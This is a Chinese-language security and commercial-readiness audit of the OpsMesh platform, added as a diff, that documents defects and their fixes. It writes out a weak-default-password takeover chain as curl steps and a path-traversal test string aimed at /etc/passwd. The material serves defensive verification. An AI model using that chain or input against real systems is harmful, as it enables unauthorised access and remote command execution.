@@ -1,0 +1,866 @@
+# OpsMesh 商用化就绪度评估报告
+
+> **评估日期**：2026-09-25
+> **评估对象**：`F:\Nexus\OpsMesh`（v0.9.0，commit `2c87a0b`）
+> **评估视角**：以「能否正式商用交付给企业客户」为准绳，而非「代码质量是否良好」
+> **评估方法**：静态阅读 + **实际编译并运行二进制做黑盒验证**（前者读代码，后者跑产品）
+> **与既有报告的关系**：`docs/evaluation-report.md`（2026-09-16）已覆盖代码质量维度且标记 35/35 已修复。本报告**不重复**该维度，聚焦其未覆盖的**商用阻断项**，并对其中的错误结论做了实证纠正。
+
+---
+
+## 0. 摘要
+
+**一句话结论**：这是一个**工程量真实、设计有想法、但当前配置下无法交付给客户**的项目。
+
+代码规模与测试投入可观（Go 24.3 万行，测试占 45%），核心机制（真实网段扫描纳管、DAG 编排、版本化迁移、gRPC 适配层）确实落地而非 PPT。但**按文档启动生产模式后，客户既登不进去、又不安全**——这不是代码质量问题，是「产品能不能交出去」的问题。
+
+| 维度 | 评级 | 说明 |
+|---|---|---|
+| 代码规模与结构 | ★★★★☆ | 24.3 万行，35 个 internal 包，分层清晰 |
+| 实现真实性 | ★★★★☆ | 核心功能真实现，非脚手架；网段扫描/SQL 持久化/迁移框架均落地 |
+| 测试投入 | ★★★★☆ | 测试占 45%，实测通过；但以 mock 为主，未覆盖真实多副本/并发场景 |
+| 安全基线（读代码） | ★★★☆☆ | TLS/JWT/密码策略/SSRF/注入防护齐全，设计意识强 |
+| **安全基线（跑起来）** | ★★★☆☆ | 预置弱口令接管与管理员锁死**已修复**（P0-1）；Web 明文 HTTP 与 TLS 静默降级**已修复**（P0-2）；降级姿态显式化且生产默认 HTTPS |
+| 多租户隔离 | ★★★★☆ | `users.tenant_id` + JWT 租户声明落库；跨租户下发路径已加统一校验；租户头伪造被拒 |
+| 部署可用性 | ★★★★☆ | compose 路径真机跑通；企业版前端由镜像构建期装配进二进制、开箱可用 |
+| 升级与灾备 | ★★★★☆ | 迁移加咨询锁 + checksum/版本门禁 + 可重放；18 个 `.down.sql` + 手工回滚手册 |
+| 许可与商务机制 | ★★☆☆☆ | Apache-2.0 + 无第三方声明 + 无授权/版本机制（**未修，非技术阻断**） |
+| **商用就绪度** | **★★★★☆** | 7 项 P0 阻断项全部修复并经真机验证；剩余为许可合规与 P1 项 |
+
+**修复到「可商用」的总工作量估算：约 45–65 人天**（不含可选的企业级功能补齐）。其中 6 项 P0 阻断项约 25–40 人天，是唯一必须先做掉的部分。
+
+> **进度（2026-09-25）**：**P0-1 ~ P0-7 七项阻断项已全部修复**，并以真机全栈复验收口（明细见 §2 各自
+> 「修复交付物」与 §9 / §10）：
+> - 第一批（P0-1/P0-2/P0-4/P0-7）：`deploy.sh up` 退出码 0，17 容器全 Up，端口真实可达，冒烟含
+>   「采集目标全 UP」断言全绿；`verify-runtime.sh` **38 项全过**。
+> - 第二批（P0-3/P0-5/P0-6，含 P1-8）：重建镜像（内置企业版前端）后重跑，**扩展至 58 项全过**
+>   （新增企业版前端交付、压缩协商、迁移版本门禁、租户列落库、租户伪造拒绝等断言）；
+>   真实 MySQL 8.0.46 上迁移集成测试 13/13 通过（含整链回滚）。静态门禁 20 项全过。
+> - 过程中由「体积/头比对」断言抓出并修复 1 个自查漏网的缺陷：gzip 预压缩旁路把
+>   `Content-Encoding` 头值（`gzip`）当文件后缀用，导致 gzip 客户端静默拿到未压缩原文
+>   （服务端仍 200，只表现为体积翻 4 倍）。已修并补测试 + 运行时逐编码断言。
+>
+> **尚未完成**：许可与商务机制（§3 P1 面，非技术阻断）；`services/` 双轨收敛（TD-60，路线图阶段四）。
+
+---
+
+## 1. 本次评估的实证方式
+
+上一轮评估是纯静态的（6 维度子代理读代码）。**读代码看不出「跑起来会不会崩」。** 本次补充了黑盒验证：
+
+```
+go build -o /tmp/opsmesh-eval ./cmd/opsmesh   → RC=0（90MB）
+启动 --production + TLS + JWT + 加密密钥        → 启动成功
+HTTP  :18082/healthz                           → 200（明文！）      ← P0-2 复验后：400
+HTTPS :18082/healthz                           → 连接失败（无 TLS 监听）← P0-2 复验后：200
+curl -H 'X-Tenant-ID: attacker-tenant' /api/v1/devices → 401（租户头伪造被正确拒绝 ✓）
+curl 登录 admin/admin123                        → 401 invalid username or password
+curl 登录 operator/operator123                  → 200 ← 预置弱口令在生产仍可登录
+curl 改密（用已知旧口令）                        → 200 + 返回完整 JWT ← 账号被完全接管
+curl /enterprise/（界面上的按钮）                → 404
+```
+
+**下列所有 P0/P1 结论均为运行时或代码双重证据，标注了文件与行号。**
+
+---
+
+## 2. P0 阻断项（不修完不可交付）
+
+### P0-1 生产模式下管理员被锁死，且预置弱口令账号可被公开接管 🔴 最严重
+
+> **状态：已修复（2026-09-25）**，代码 + 运行时黑盒复验通过。修复实现见本节末尾「修复交付物」。
+
+**这是本次评估发现的最严重问题，同时也是「产品不可用」和「产品不安全」的叠加。**
+
+**现象 A：管理员无法登录。** 非 demo 模式下启动，`admin` 口令被替换为 32 位随机串，明文**不写日志、不落文件、无 flag 可设**。
+
+```
+证据：internal/controlplane/auth_password.go:44-79
+      internal/controlplane/server.go:468-469（非 demo 触发轮换）
+实测：--mode=controlplane（非 demo）启动日志：
+      "[controlplane] 安全提示：默认 admin 密码已替换为随机口令"
+      curl 登录 admin/admin123 → 401
+      同一日志紧接着提示："请通过 --admin-password-file 或首登获取"
+```
+
+**而这两个 flag 根本不存在：**
+
+```
+证据：grep -rn 'admin-password-file|admin-password-stdout' 全仓库
+      → 仅命中 auth_password.go:75,76,78 三行注释/日志文案本身
+      → internal/config/config.go 的 119 个 flag 中无此项
+```
+
+即：**运维无法获得管理员口令，也没有任何重置命令、环境变量或文档化的恢复流程。客户拿到的是一台无人能登录的设备。**
+
+**根因（文档与代码互相矛盾的第三处）：**
+
+```
+docs/operations.md:288
+  | admin 密码 | 固定 admin/admin123 | 随机化（首次启动日志输出） |
+                                                ^^^^^^^^^^^^^^^^^^ 已不成立
+```
+
+文档承诺「随机化后**首次启动日志输出**」，但该行为正是被 S7 安全修复刻意移除的（`auth_password.go:74-78` 注释明写「S7 修复：不在日志中打印明文密码」）。**安全修复移除了唯一的交付通道，却没有补上替代机制**——注释里写的 `--admin-password-stdout` / `--admin-password-file` 两个 flag 从未实现。这是一次**未完成的安全加固导致的可用性回归**，也解释了为何它能逃过既往 35 项静态自查：每一项单看都「已修复」，但组合起来把产品锁死了。
+
+**现象 B：其他预置账号仍是公开弱口令，且可被完全接管。**
+
+```
+证据：internal/store/sql_rbac.go:408-430（种子用户 operator/operator123、viewer/viewer123）
+      internal/store/sql_rbac.go:444-448（operatorGroups 含 task → operator 拥有 task:write）
+实测（非 demo 模式，全新实例）：
+  1. POST /auth/login {"username":"viewer","password":"viewer123"} → 200
+     （返回 changePasswordToken，mustChangePassword=true）
+  2. POST /auth/change-password
+     {"oldPassword":"viewer123","newPassword":"Pwned!2345","changePasswordToken":"<上一步>"}
+     → 200，返回完整 JWT（含 permissions 数组）
+  → 攻击者仅凭公开仓库里的口令即取得有效会话
+```
+
+**为什么这是 P0 而不是中危**：`operator` 角色被授予 `task:write`（`sql_rbac.go:445,458`），而 `task:write` = 向纳管设备下发 shell 任务 = **被管机群上的任意命令执行**。这条链路对任何读过本仓库（Apache-2.0 公开仓库）的人是零门槛的：**读代码 → 拿到口令 → 登录 → 改密 → 获得机群 RCE**。
+
+> 既有评估报告第 7 章将 `operator123` 判为「被强制改密机制中和」（安全子代理同结论），**该结论经实测不成立**：强制改密只阻止了直接调用 API，不阻止用已知旧口令完成改密并取得会话。
+
+**修复方案（约 2–3 人天）**
+1. 新增 `--admin-initial-password`（或 `--admin-password-file`），使运维可控；二者至少实现一个，并同时修正 `auth_password.go:75-78` 的误导文案。
+2. 轮换范围从「仅 admin」扩展到**全部种子账号**；生产模式若检测到任何种子账号仍为初始口令，**拒绝启动**（fail-fast，与现有 TLS/JWT 校验风格一致）。
+3. 提供文档化的口令恢复路径（如 `opsmesh admin reset-password --user admin`），写入 `docs/dr-runbook.md`。
+4. 生产模式加一条启动自检：种子账号未改密则告警/拒绝启动。
+
+---
+
+#### 修复交付物（2026-09-25 实施）
+
+**代码**
+
+| 位置 | 改动 |
+|---|---|
+| `internal/controlplane/auth_password.go` | 删除 `rotateDefaultAdminPassword`（静默锁死），新增 `enforceInitialCredentials` / `deliverAdminCredential` / `revokeSeedCredentials`。admin 弱口令替换后必须经交付通道落地；operator/viewer 的公开弱口令一律替换为随机不可知口令 |
+| `internal/controlplane/server.go:468-475` | 非 demo 启动时调用 `enforceInitialCredentials`，返回错误即中止启动（fail-fast） |
+| `internal/config/config.go` | 新增 `--admin-password` / `--admin-password-file` / `--admin-password-force-reset`（含 `OPSMESH_ADMIN_PASSWORD` 等 env 映射）；`Validate()` 拒绝「只开恢复开关却不给口令」 |
+| `services/auth-svc/cmd/auth-svc/main.go` | 同源缺陷同步修复：`AUTH_SVC_ADMIN_PASSWORD` / `AUTH_SVC_ADMIN_PASSWORD_FILE`，并明确告警「默认日志交付会进日志采集」 |
+| `deploy/helm/opsmesh/` | Secret 新增 `admin-password`（显式 > 复用 > 首次随机，随机值前缀 `Aa1` 保证满足强口令校验）；Deployment 注入 `OPSMESH_ADMIN_PASSWORD`；`NOTES.txt` 给出读取命令 |
+| `deploy/docker/docker-compose.prod.yml`、`deploy/docker/scripts/deploy.sh`、`deploy/systemd/opsmesh-controlplane.env` | 三条部署路径均接入口令交付通道 |
+
+**行为矩阵（实测）**
+
+| 场景 | 修复前 | 修复后 |
+|---|---|---|
+| 生产 + 无交付通道 | 启动成功但**无人能登录** | **拒绝启动**，报错指明 `OPSMESH_ADMIN_PASSWORD` / `--admin-password-file` |
+| 生产 + `OPSMESH_ADMIN_PASSWORD` | 不适用 | admin 用该口令登录 200 → 首登强制改密 → 拿到正式 JWT |
+| 生产 + `--admin-password-file` | 不适用 | 文件（0600）中的随机口令可登录 200 |
+| 非生产非 demo | 同上锁死，且无提示 | 随机口令打印到 stderr，开发者不被锁死 |
+| demo 模式 | `admin/admin123` 可登录 | 不变（保留一键演示，启动强告警） |
+| `operator123` / `viewer123` | 200 登录 → 可完成改密 → 机群 RCE | **401**（启动即替换为随机不可知口令） |
+
+**回归测试**：`internal/controlplane/auth_extra_test.go` 新增 9 个用例（生产无通道 fail-fast、显式口令生效、弱口令拒绝、口令文件 0600、目录缺失报错、幂等不回滚、强制恢复、无 admin 账号、种子账号清除）；`internal/config/security_defaults_test.go` 新增 3 个；`services/auth-svc/cmd/auth-svc/main_test.go` 新增 5 个。受影响包 `go test` 全绿。
+
+**遗留（不在本次修复范围）**：`deploy/docker/index.html` 是遗留冒烟测试页（硬编码 `viewer/viewer123`、回显 token），未被任何 compose 引用，建议删除（见 §3）。
+
+---
+
+### P0-2 生产模式 Web/REST 接口是明文 HTTP，而部署文档宣称已启用 TLS 🔴
+
+> **状态：已修复（2026-09-25）**，代码 + 运行时黑盒复验通过（16/16 断言）。修复实现见本节末尾「修复交付物」。
+
+`--production` 会**强制要求** `--tls-cert`，否则拒绝启动（`config.go:997-1000`），给人一种「已满足等保三级传输加密」的错觉。实际上**该证书只用于 gRPC，浏览器访问的 HTTP 接口全程明文**。
+
+```
+证据：internal/controlplane/server_lifecycle.go:319  httpSrv.ListenAndServe()   ← 明文，无 TLS 分支
+      internal/controlplane/server.go:50-51,301-302  tlsCert/tlsKey 仅被存储
+      internal/controlplane/server_middleware.go:28  当 tlsCert != "" 时注入 HSTS ← 假定自己在跑 HTTPS
+实测：--production --tls-cert=/tmp/c.pem ...
+      http://127.0.0.1:18082/healthz  → 200
+      https://127.0.0.1:18082/healthz → 连接失败（该端口不是 TLS 监听）
+```
+
+**并且文档给出了错误的操作指引**，会让运维配出一个连不通的代理：
+
+```
+docs/deployment-guide.md:728
+  "跨网段建议走 HTTPS（控制面 --tls-cert / --tls-key 启用 HTTP TLS，
+   Nginx proxy_pass https://controlplane:8080; + proxy_ssl_verify on;）"
+```
+
+而 `README.md` 的 flag 表中 `--tls-cert` 明确定义为「**gRPC** TLS 服务端证书路径」——文档内部自相矛盾，且部署手册那一侧是错的。
+
+**商用影响**：登录口令、JWT、审计数据、任务输出全部明文过网。这直接违反等保三级「通信传输保密性」要求，而产品文档恰恰主打等保三级合规。企业客户的安全评审必然拦下。
+
+**修复方案（约 1–3 人天，二选一）**
+- **方案 A（推荐，成本低）**：把 HTTP TLS 做成受控特性或明确排除。修正 `deployment-guide.md:728`，改为明确要求 TLS 在 Nginx/Ingress 终止，并删除「--tls-cert 启用 HTTP TLS」的表述；同时移除 `server_middleware.go` 中基于 `tlsCert` 的 HSTS 注入（避免误导），改为由代理注入。
+- **方案 B**：真的实现 HTTP TLS——`--tls-cert` 非空时走 `ListenAndServeTLS`（约 20 行），并让 `--production` 在 HTTP 面向公网时强制要求它。
+
+---
+
+#### 修复交付物（2026-09-25 实施）
+
+采用**方案 B（真做 TLS）并兼容方案 A 的部署形态**：新增 `--http-tls=auto|on|off` 三态开关，把「控制面直供 TLS」与「上游 Ingress 终止 TLS」两种既存部署姿态都变成显式声明，而不是让代码静默选一种。
+
+**代码**
+
+| 位置 | 改动 |
+|---|---|
+| `internal/config/config.go` | 新增 `HTTPTLS` 字段（`--http-tls` / `OPSMESH_HTTP_TLS`）；`Validate()` 新增三项：非法取值拒绝、`on` 必须配齐 cert+key、**生产模式只有 `--tls-cert` 而无 `--tls-key` 直接拒绝启动**（原先此组合会静默退回 gRPC 明文，是同一处根因里更隐蔽的降级路径） |
+| `internal/controlplane/server_netsec.go` | 新增 `buildHTTPTLS()`：`off`→返回 nil（明文）；`auto`→cert+key 齐备才 TLS；`on`→缺证书报错。TLS 配置**复用 `--tls-watch` 的热重载器**（证书轮换对 Web 与 gRPC 同时生效），回退路径走 `tlsutil.HTTPServerTLSConfig`，`MinVersion=TLS1.2` |
+| `internal/controlplane/server_lifecycle.go` | Web/REST 监听由裸 `httpSrv.ListenAndServe()` 改为「先 `net.Listen` 再按 scheme 选择 `Serve` / `ServeTLS`」（`:319` 原缺陷点）；启动日志新增 `scheme`/`http_scheme` 字段，明文降级在生产模式打 WARN |
+| `cmd/opsmesh/main.go` | `--health` 探针改为 **HTTPS 优先、失败回退 HTTP**（`InsecureSkipVerify`，等价 `curl -k`，仅用于本机存活探测）。否则 compose/k8s 的健康检查在启用 HTTPS 后会全线失败——这是开启 TLS 的连带损害面 |
+| `services/auth-svc/` | 不涉及：auth-svc 无 B/S 监听器，本次修复为控制面单侧 |
+| `deploy/helm/opsmesh/` | 新增 `controlplane.httpTLS`（默认 `off`，与「TLS 由 Ingress 终止」的既有形态一致并显式化）；`httpTLS=on` 时两个探针自动切 `scheme: HTTPS` |
+| `deploy/systemd/opsmesh-controlplane.env` | 补 `OPSMESH_HTTP_TLS` 说明；修正 `OPSMESH_ADVERTISE_ADDR` 由 `http://0.0.0.0:8080`（既非法主机名、又不满足 `pkg/provision/auto.go:91` 生产要求 `https://` 的自动纳管前置条件）为 `https://opsmesh.example.com:8080` |
+| `docs/deployment-guide.md` `docs/operations.md` `README.md` | 修正原「`--tls-cert` 启用 HTTP TLS」的错误表述（**这是 P0-2 的文档侧根因**）；补 `--http-tls` 三态语义表、启动失败诊断、生产检查清单 |
+
+**行为矩阵（实测，16/16 断言）**
+
+| 场景 | 修复前 | 修复后 |
+|---|---|---|
+| 生产 + cert/key + `auto`（默认） | 明文 HTTP，但注入 HSTS、下发 Secure Cookie（进程自认为已 HTTPS） | `https://` 返回 **200** 且证书为所配置者；同一端口发明文 HTTP 返回 **400**（Go 拒绝明文到 TLS 监听）；gRPC TLS 不受影响；`--health` 返回 0 |
+| 生产 + cert/key + `off` | 同左（无差别） | 明文 200 + 启动 WARN（指明 Secure Cookie 与 MITM 风险）+ `--health` 回退成功；**姿态显式，不再是意外** |
+| 生产 + `on` 但缺 cert/key | 启动成功，静默明文 | **拒绝启动**，报错指明 `--http-tls=on` 需 cert+key |
+| 生产 + `--tls-cert` 无 `--tls-key` | 启动成功；gRPC **静默明文** | **拒绝启动**（`--tls-key` 缺失） |
+| 非生产默认 | 明文 | 明文（行为不变，不破坏既有开发/演示流程） |
+| 上游 Ingress/Nginx 终止 TLS | 文档错误指引 `proxy_pass https://controlplane:8080`（连不通） | 文档改为「控制面 `--http-tls=off` + 代理终止 TLS」，与实际代码一致 |
+| 浏览器 `http://` 访问 TLS 端口 | 业务内容正常返回 | 400 拒绝（会话不再经明文外泄的第一道防线） |
+
+**回归测试**：`internal/config/http_tls_test.go` 新增 7 个用例（默认值、flag/env/大小写归一、非法值、`on` 缺证书 ×3、生产 `off` 合法、空值等同 auto、生产 cert 无 key 拒绝）；`internal/controlplane/http_tls_test.go` 新增 7 个（自签 ECDSA P-256 证书夹具 + `httptest` 真 TLS 握手：auto/off/on/非法/空值、复用 `--tls-watch` 热重载器、**真实证书链校验下的 200 与明文非 200**）；`cmd/opsmesh/main_test.go` 新增 2 个（HTTPS 探针成功/非 200）。因新增「生产 cert 无 key 拒绝」规则，同步修正 5 处既有测试夹具补 `TLSKey`。相关包 `go test` 全绿（EXIT=0），`helm template` 三种配置渲染通过。
+
+**说明（为什么不是「二选一」）**：本次评估原建议二选一，但实测发现产品**同时**存在两种真实部署形态——`deploy/docker/*` 让控制面直供端口，`deploy/helm/*` 用 Ingress 终止 TLS。任何单侧硬编码都会打破另一种形态；三态开关使两种姿态都显式、可审计，且生产默认（有证书即 HTTPS）满足等保三级传输加密。
+
+**遗留**：`deploy/docker/docker-compose.prod.yml` 缺证书则无法启动的问题属 P0-4（该文件另有独立缺陷），未在本次范围内。
+
+---
+
+### P0-3 企业版前端（战略 UI）没有任何可交付路径，且随包界面上的入口是 404 🔴
+
+> **状态：已修复（2026-09-25）**，`go:embed` 接线 + 路由 + 镜像构建 + CI 黑盒验收全部落地。
+> 修复实现见本节末尾「修复交付物」，镜像内实测证据见 **§10.2**（含 br/gzip 压缩协商与 SPA 回退逐字节一致性）。
+
+产品实际上有**两套前端**：
+
+| 版本 | 位置 | 技术栈 | 是否随二进制交付 |
+|---|---|---|---|
+| 个人版 | `internal/controlplane/embed/web/` | 原生 ES Module，88 个 .js | ✅ 已 go:embed 进二进制 |
+| 企业版 | `web/enterprise/` | Vue3 + Vite，223 个 .js/.vue | ❌ **未嵌入、无路由、未进任何部署资产** |
+
+```
+证据：internal/controlplane/server_lifecycle.go:23-24  仅注册 "/" 与 "/assets/"
+      grep -rn 'enterprise' --include=*.go internal/ cmd/  → 仅命中注释，无路由注册
+      grep -rln 'enterprise' deploy/ docker-compose*.yaml Dockerfile*  → 无任何命中
+      web/enterprise/dist/  存在，但 git ls-files 计数 = 0（未入库，本地构建产物）
+      web/enterprise/node_modules  不存在
+实测：curl http://127.0.0.1:18080/enterprise/      → 404
+      curl http://127.0.0.1:18080/enterprise/index.html → 404
+```
+
+而个人版首页里有一个醒目的 CTA 指向它：
+
+```html
+<!-- internal/controlplane/embed/web/index.html -->
+<a class="btn-enterprise" href="/enterprise/">进入企业版前端 →</a>
+```
+
+**影响**：按 README「快速启动（零依赖，30 秒）」走的第一个用户，点开浏览器看到的第一个主按钮就是 404。而 `DELIVERY.md` §4.5 用整章篇幅把企业版前端描述为交付主体（13 个子域、1121 个 vitest 用例）。Helm/Compose/K8s 三种部署形态**都不包含它**。客户需要一个「企业版」产品时，拿到的只有一个 gitignored 的 dist 目录和一句「请自行 npm install && npm run build」。
+
+**修复方案（约 3–5 人天）**
+1. CI 增加企业版构建 job，产物以 `go:embed` 注入（或独立 nginx 镜像）。
+2. Go 侧注册 `/enterprise/` 静态路由并正确设置 `base: '/enterprise/'` 的资源前缀（Vite 已配 `base`，但无服务端）。
+3. Helm/Compose 增加前端交付路径（内嵌或 sidecar nginx），并在 `deploy/k8s/` 补齐。
+4. 在个人版入口按钮上做兜底：企业版不可用时不展示该链接。
+
+**修复交付物（2026-09-25 实施，方案 1+2+4；弃用方案 3 的 sidecar 路线）**
+
+选择「内嵌进控制面二进制」而非「sidecar nginx」：企业版前端是控制面的 UI，分两个容器会引入
+额外的端口/证书/健康检查契约，而 `go:embed` 已经把个人版前端打进去了——同一机制零新增运维面。
+
+1. **`go:embed` 接线**：`internal/controlplane/embed/embed.go` 新增 `EnterpriseFS`（嵌入
+   `internal/controlplane/embed/enterprise`）。go:embed 不能跨目录，故产物必须落到该目录，
+   由 `deploy/docker/scripts/build-enterprise-web.sh`（`npm ci && npm run build` → 拷贝 dist/）完成组装；
+   `make frontend` 已改为调用该脚本（此前只跑 `npm run build`，产物永远进不了二进制——这正是缺陷根因）。
+2. **静态路由**：新增 `internal/controlplane/enterprise_ui.go`：
+   - `GET /enterprise/` → 外壳；`/enterprise/devices` 等前端路由按 vue-router history 模式
+     回退 `index.html`；缺失的前端分包显式 404（不伪装成 HTML，避免 MIME 报错难排查）；
+   - `GET /enterprise/assets/*` → 带内容哈希的资源长缓存 `immutable`，`index.html`/`sw.js` 等入口
+     `no-cache`；支持 `.br`/`.gz` 预压缩旁路协商（Vary: Accept-Encoding）；
+   - 路径穿越（`/enterprise/assets/../..`）一律 404，只读 embed.FS、不回落宿主文件系统；
+   - `/enterprise`（无尾斜杠）301 到 `/enterprise/`（否则 Vite 相对资源路径会挂到站点根）。
+   - **有意不做租户头校验**：浏览器不会带 `X-Tenant-ID`，且空白外壳必须先渲染出登录页；
+     隔离由 `/api/v1/*` 的鉴权承担（外壳内无任何数据）。
+3. **未内置时的诚实降级**（方案 4）：产物目录入库一个 `placeholder.html`（含标记），
+   `bundleAvailable()` 以「`index.html` 是否存在且不含标记」判定；未内置时
+   `/enterprise/` 返回说明页（200 + `X-OpsMesh-Enterprise-Bundle: placeholder`，不是 404），
+   且个人版首页的「进入企业版前端 →」入口被服务端自动摘除（HTML 内以
+   `<!--OPSMESH_ENTERPRISE_CTA_START/END-->` 包裹，`stripEnterpriseCTA` 处理）。
+   这样「源码构建（无 Node）」与「发布镜像」两条路径都不会把用户送到 404。
+4. **镜像交付**：`Dockerfile`（CI 发布镜像 / Makefile docker）与 `deploy/docker/Dockerfile.controlplane`
+   （`deploy.sh up` / compose）都新增 `node:22-alpine` 构建阶段，产物 `COPY --from=web` 覆盖 embed 目录，
+   构建失败即镜像构建失败（不静默降级为占位页）。受限网络可 `--build-arg NPM_REGISTRY=<镜像源>`。
+   同步修正 `.dockerignore`：此前整体排除 `web/`，镜像构建根本拿不到前端源码（缺陷的另一半成因）。
+5. **CI 防回归**（`frontend` job 扩展）：vitest 通过后组装产物 → 跑 `TestEnterprise*`（真实产物态）
+   → 构建二进制并**黑盒启动**，断言 `/enterprise/` 200、外壳引用产物、静态资源 200、
+   SPA 回退 200、个人版首页保留入口、且**不得**出现占位页特征。
+   占位态的用例由 `build-test` job 的常规 `go test` 覆盖（两态都测）。
+
+**实测收口（2026-09-25，本机二进制 + 真实产物）**：
+`GET /enterprise/` 200（`Content-Type: text/html`，`Cache-Control: no-store`，CSP 正常）；
+外壳引用 `/enterprise/assets/js/index-DZhQRfLW.js`；该资源 200（37.4KB，
+`Accept-Encoding: br` 时 `Content-Encoding: br` + `Vary: Accept-Encoding`，`immutable` 长缓存）；
+`GET /enterprise/devices` 200 且与外壳逐字节一致；`GET /enterprise/assets/js/nope.js` 404；
+`/enterprise/assets/../../../etc/passwd` 404；个人版 `GET /` 保留 `href="/enterprise/"` 入口且无标记残留。
+占位态（临时移除 `index.html`）下 `TestEnterprise*` 同样全绿、入口被摘除、说明页 `未内置`。
+
+---
+
+### P0-4 主要部署资产开箱即坏（客户第一小时就跑不起来）
+
+```
+证据：deploy/docker/docker-compose.prod.yml
+  - 默认 OPSMESH_PRODUCTION=true，但未传 TLS 证书与 OPSMESH_ENCRYPTION_KEY
+    → config.Validate() 拒绝 → cmd/opsmesh/main.go:63 退出码 1 → 容器 CrashLoopBackOff
+  - MySQL 启动参数含 MySQL 8.0 已移除的 --query-cache-type=1 → mysqld 自身启动失败
+证据：deploy/k8s/ 为半成品：仅 5 个微服务 deployment，无 controlplane / MySQL / Redis
+      configmap 设置 OPSMESH_LOG_LEVEL/FORMAT，但无任何 Go 代码读取这两个键
+证据：deploy/gitops/ 生产段镜像 tag 钉在 0.7.0，chart 为 0.9.0（版本漂移）
+```
+
+**影响**：`docker compose up` 起不来；k8s 路径不可用；GitOps 路径会部署旧版本。Helm Chart 本身质量较好（19 模板、Secret lookup 持久化、备份 CronJob 齐备），但需要手工 override 才能生产用。
+
+**修复方案（约 5–8 人天）**：修 compose.prod 的环境变量与 MySQL 参数；补齐或明确废弃 `deploy/k8s/`；GitOps tag 对齐；CI 增加「部署资产可渲染 + 变量与 config.go 对齐」校验。
+
+#### 修复交付物（2026-09-25 实施，以「真机把生产栈跑起来」为验收）
+
+验收方式不是静态检查，而是反复执行 `deploy/docker/scripts/deploy.sh up` 直到全栈真实起来。
+下面 7 个阻断项**全部通过了静态检查**，只在真机启动时才暴露——这也是上一轮「35/35 已修复」
+与「compose 起不来」能同时成立的原因：
+
+| # | 症状（真机实测） | 根因 | 修复 |
+|---|---|---|---|
+| 1 | 微服务镜像构建失败 | 构建上下文必须是仓库根：`services/*/go.mod` 含 `replace opsmesh => ../..`，单服务目录做上下文时容器内无主模块 | compose 统一「根上下文 + `Dockerfile.service` + `--build-arg SERVICE/VERSION`」，与 `release.yml` / `deploy-opsmesh.sh` 同契约 |
+| 2 | Loki CrashLoop | 配置按 Loki 2.x 写（`chunk_store_config.max_look_back_period`、`compactor.shared_store`），镜像钉的是 `grafana/loki:3.2.0` | 改为 `limits_config.max_query_lookback` + `compactor.delete_request_store` |
+| 3 | otel 配置加载失败 | health_check 扩展用了 0.110.0 已移除的 `exporter_names` 键 | 改为 `exporter_failure_threshold: 5` |
+| 4 | otel CrashLoop：`bind: address already in use (8888)` | 0.110.0 内部遥测默认仍监听 `:8888`，与应用侧 prometheus exporter 撞端口 | `service.telemetry.metrics.address: 0.0.0.0:8889`，新增 `otel-collector-internal` 采集 job |
+| 5 | otel 恒 `unhealthy`（但进程正常） | distroless 镜像无 shell / 无 wget，`CMD wget` 健康检查无法执行（`executable file not found in $PATH`） | 移除容器内 healthcheck；把 health_check 扩展端口发布到 `127.0.0.1:13134`，由 deploy.sh 从宿主探活 |
+| 6 | auth-svc 初始口令引导失败：`must contain at least one special character` | 生成器只满足控制面策略，而 auth-svc 策略更严（≥12 位 + 大小写 + 数字 + 特殊字符） | 统一按「两套策略的并集」生成与预检，不合规 .env 在预检阶段即被拦下 |
+| 7 | **13 个容器声明了宿主端口却全部不可达** | `backend_net`/`monitoring_net` 标了 `internal: true`，其上的容器又声明了宿主端口。Docker Desktop(WSL2) 对「所连网络全为 internal」的容器会**静默丢弃** publish：容器 Up/healthy，但 `NetworkSettings.Ports` 为空、`docker port` 无输出、`compose up` 不报任何错 | 去掉两处 `internal: true`；入站边界继续由「端口只发布到 `127.0.0.1`」保证 |
+
+第 7 项的判定依据是下面的对照实验（同一镜像、同一宿主端口、仅网络不同）：
+
+```
+--network opsmesh-backend(internal)   → Ports={"9090/tcp":[]}                                curl → 000
+--network opsmesh-frontend            → Ports={"9090/tcp":[{"HostIp":"127.0.0.1","HostPort":"28102"}]} curl → 200
+--network opsmesh-backend + frontend  → Ports={"9090/tcp":[{"HostIp":"127.0.0.1","HostPort":"28103"}]} curl → 200
+```
+
+附带发现（同一根因，属功能不可用而非仅是端口问题）：internal 网络没有网关，**出站 DNS 也不通**。
+实测 `opsmesh-alert-svc` 容器内 `getent hosts events.pagerduty.com` 直接解析失败，而 compose 为它
+配了 `PAGERDUTY_API_URL=https://events.pagerduty.com/v2/enqueue`——即 PagerDuty 集成在
+`internal: true` 下**永远不可能工作**。若确需限制微服务出站，应改用宿主防火墙或 K8s NetworkPolicy。
+
+**防回归**：`deploy/scripts/validate-deploy-assets.sh` 新增硬门禁——凡声明了 `ports` 的服务，
+其网络不能全为 `internal: true`（注入 `internal: true` 后门禁实测报出 8 个服务，见 §9）。
+该脚本已接入 CI `security` job（`.github/workflows/ci.yml`）。
+
+#### 附带修复：监控栈开箱即产生 5 条 critical 假告警
+
+栈跑起来后查 Prometheus 的 `/api/v1/alerts`，一个**完全健康**的部署上常驻 5 条 critical：
+
+```
+firing MySQLDown        job=opsmesh-mysql  severity=critical
+firing RedisDown        job=opsmesh-redis  severity=critical
+firing ServiceDown      job=opsmesh-redis  severity=critical
+firing ServiceDown      job=opsmesh-mysql  severity=critical
+firing ServiceDown      job=docker         severity=critical
+```
+
+根因两处：
+1. `prometheus.yml` 的 `opsmesh-mysql` / `opsmesh-redis` 用了 blackbox_exporter 的协议
+   （`metrics_path: /probe` + `params.module: tcp_connect`），但**栈内没有 blackbox-exporter**，
+   且 job 缺 `relabel_configs`——等价于让 Prometheus 直接向 MySQL/Redis 发 HTTP `/probe` 请求，
+   target 恒 DOWN。
+2. `docker` job 指向 `host.docker.internal:9323`，而 dockerd 默认不暴露 `/metrics`
+   （需显式配置 `metrics-addr`；Linux 宿主默认也没有 `host.docker.internal` 这个主机名）。
+
+叠加 `prometheus-alerts.yml` 里的 `up == 0` / `MySQLDown` / `RedisDown`，就是永久的红色噪音。
+**假告警比不配告警更危险**：它训练值班人员整体忽略告警，真故障会随之被淹没。
+
+修复：新增 `blackbox-exporter`（`prom/blackbox-exporter:v0.25.0` + `deploy/monitoring/blackbox.yml`，
+仅内网抓取不发布宿主端口）；给两个拨测 job 补齐标准 `relabel_configs`（`__param_target` /
+`instance` / `__address__`）；`docker` job 默认注释并写明启用方式。
+`deploy.sh` 冒烟测试新增断言：`up == 0 and (time()-timestamp(up)) < 60` 必须为空，
+否则**判部署失败**（用 `timestamp` 过滤是为了排除「配置里已删除的 job」在 5 分钟
